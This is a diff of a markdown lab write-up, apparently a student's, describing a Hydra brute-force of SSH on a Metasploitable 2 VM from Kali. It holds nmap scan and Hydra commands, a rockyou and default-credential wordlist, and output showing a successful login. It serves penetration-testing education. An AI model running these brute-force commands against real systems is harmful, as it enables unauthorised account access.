@@ -22,7 +22,9 @@ Simulate a brute-force attack against an SSH service using Hydra to test passwor
 ## Lab 
 ### STEP 1
 
-#### Ensure Metasploitable 2 is powered on and reachable from Kali. Confirm SSH is enabled on the target:
+#### Ensure Metasploitable 2 is powered on and reachable from Kali
+
+Confirm SSH is enabled on the target:
 
 ```bash
 nmap -sS -sV -O 192.168.56.102
@@ -33,9 +35,9 @@ Confirm that SSH is running and reachable (I did a little extra)
 
 ### STEP 2 
 
-Enable SSH client compatibility in Kali (After SSH atttept failed)
+#### Enable SSH client compatibility in Kali (After SSH atttept failed)
 
-Failed SSH attempt
+#### Failed SSH attempt
 ```bash
 ──(kali㉿kali)-[/usr/share/wordlists]
 └─$ hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt.gz  ssh://192.168.56.102
@@ -47,8 +49,10 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-07-01 13:11:
 [DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
 [DATA] attacking ssh://192.168.56.102:22/
 [ERROR] could not connect to ssh://192.168.56.102:22 - kex error : no match for method server host key algo: server [ssh-rsa,ssh-dss], client [ssh-ed25519,ecdsa-sha2-nistp521,ecdsa-sha2-nistp384,ecdsa-sha2-nistp256,sk-ssh-ed25519@openssh.com,sk-ecdsa-sha2-nistp256@openssh.com,rsa-sha2-512,rsa-sha2-256]
-``` 
-Enable SSH Client
+```
+
+#### Enable SSH Client
+
 ```bash
 sudo kali-tweaks
 ```
@@ -63,12 +67,12 @@ Toggle SSH Client
 This allows Hydra to connect to legacy SSH servers like Metasploitable 2
 
 ### STEP 3
-Attempting RockYou (Too large)
+#### Attempting RockYou (Too large)
 
 ```bash
 hydra -l msfadmin -P /usr/share/wordlists/rockyou.gz ssh://192.168.56.102
 ```
-Failed (Cancelled) due to large size
+#### Failed (Cancelled) due to large size
 
 ```bash
 └─$ hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt.gz  ssh://192.168.56.102
@@ -82,7 +86,7 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-07-01 13:34:
 [STATUS] 216.00 tries/min, 216 tries in 00:01h, 14344191 to do in 1106:49h, 8 active
  [STATUS] 208.00 tries/min, 624 tries in 00:03h, 14343783 to do in 1149:21h, 8 active
 ```
-Realized I needed to uncompress file
+#### Realized I needed to uncompress file
 
 ```bash
 sudo gzip -d /usr/share/wordlists/rockyou.txt.gz
@@ -90,19 +94,19 @@ sudo gzip -d /usr/share/wordlists/rockyou.txt.gz
 
 ### STEP 4
 
-Create a faster wordlist
+#### Create a faster wordlist
 
 ```bash
 echo -e "msfadmin\nadmin\npassword\n123456\nletmein\nkali" > quicklist.txt
 ```
 
 ### STEP 5
-Run Hydra with optimization flags (Run Hydra with decompressed RockYou)
+#### Run Hydra with optimization flags (Run Hydra with decompressed RockYou)
 
 ```bash
 hydra -l msfadmin -P quicklist.txt ssh://192.168.56.102 -t 4 -V -f
 ```
-Result
+#### Result
 
 ```bash
 ┌──(kali㉿kali)-[~]
@@ -125,13 +129,13 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-07-01 13:39:
 ```
 Success!
 
-Run with uncompressed RockYou
+#### Run with uncompressed RockYou
 
 ```bash
 └─$ hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt ssh://192.168.56.102 -t 6   
 ```
 
-Result (still too long)
+#### Result (still too long)
 ```bash
 └─$ hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt ssh://192.168.56.102 -t 6       
 
